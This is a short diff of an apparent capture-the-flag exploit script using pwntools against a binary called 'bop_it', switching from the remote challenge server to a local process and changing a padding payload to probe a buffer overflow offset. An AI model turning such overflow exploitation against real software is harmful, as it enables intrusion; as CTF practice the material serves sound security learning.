@@ -1,6 +1,7 @@
 from pwn import *
 
-p = remote("shell.actf.co", 20702)
+#p = remote("shell.actf.co", 20702)
+p = process('./bop_it')
 
 while True:
 	command = p.recv()
@@ -11,7 +12,7 @@ while True:
 
 payload = ''
 payload += '\x00'
-payload += 'a'*200
+payload += 'a'*35+'b'*40+"c"*40
 print payload
 
 p.sendline(payload)
